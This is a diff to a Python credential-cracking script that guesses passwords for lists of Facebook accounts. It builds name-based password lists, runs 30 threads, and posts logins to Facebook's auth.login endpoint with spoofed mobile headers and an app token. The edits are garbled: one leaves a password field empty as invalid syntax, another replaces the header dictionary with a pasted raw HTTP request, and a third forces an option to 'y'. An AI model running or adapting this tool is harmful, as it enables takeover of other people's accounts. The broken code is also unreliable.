@@ -15,7 +15,7 @@ logo = '''
    .88.   db   8D 88booo. 88   88 88  88  88
  Y888888P `8888Y' Y88888P YP   YP YP  YP  YP
 ------------------------------------------------
-  Author : SOHAIB AHMAD
+  Author : SOHAIB AHMAD1
   Github : Unknown
   Fcbook : Not Found
 ------------------------------------------------
@@ -60,7 +60,7 @@ def file():
 	if cx in ['y','Y','yes','Yes','1']:
 		pcp.append('y')
 	else:
-		pcp.append('n')
+		pcp.append('y')
 	with tred(max_workers=30) as crack_submit:
 		clear()
 		total_ids = str(len(fo))
@@ -69,7 +69,7 @@ def file():
 		linex()
 		for user in fo:
 			ids,names = user.split('|')
-			passlist = plist
+			passlist = ('first, firstlast, first last, first123,first1122,first1234,first12345,firstlast1122,first123,last,firstlast1234,firstlast12345,firstlast786,firstlast007,first786,first007,khan1122,khan123,khankhan,khan khan, khan12345,khankhan1122,khankhan123,khankhan12345',)
 			crack_submit.submit(api,ids,names,passlist,total_ids)
 	print('\033[1;37m')
 	linex()
@@ -132,7 +132,7 @@ def api(ids,names,passlist,total_ids):
 				'currently_logged_in_userid':'0',
 				'try_num':'1',
 				'email':ids,
-				'password':pas,
+				'password':,
 				'jazoest':j2,
 				'generate_analytics_claim':'1',
 				'cpl':'true',
@@ -147,18 +147,18 @@ def api(ids,names,passlist,total_ids):
 				'access_token':f'{client_id}|{client_secrets}'
 				}
 			head = {
-				'Authorization':f'OAuth {client_id}|{client_secrets}',
-				'X-FB-Connection-Quality':'EXCELLENT',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
-				'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
-				'x-fb-friendly_name':'authenticate',
-				'content-encoding':'application/x-www-form-urlencoded',
-				'x-tigon-is_retry':'true',
-				'x-fb-http-engine':'Liger',
-				'x-requested-with':'FBIOS',
-				'connection':'close',
+				'GET /home.html HTTP/1.1
+                 Host: developer.mozilla.org
+                 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
+                 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                 Accept-Language: en-US,en;q=0.5
+                 Accept-Encoding: gzip, deflate, br
+                 Referer: https://developer.mozilla.org/testpage.html
+                 Connection: keep-alive
+                 Upgrade-Insecure-Requests: 1
+                 If-Modified-Since: Mon, 18 Jul 2016 02:36:04 GMT
+                 If-None-Match: "c561c68d0ba92bbeb8b0fff2a9199f722e3a621a"
+                 Cache-Control: max-age=0',
 				'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
 			url = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
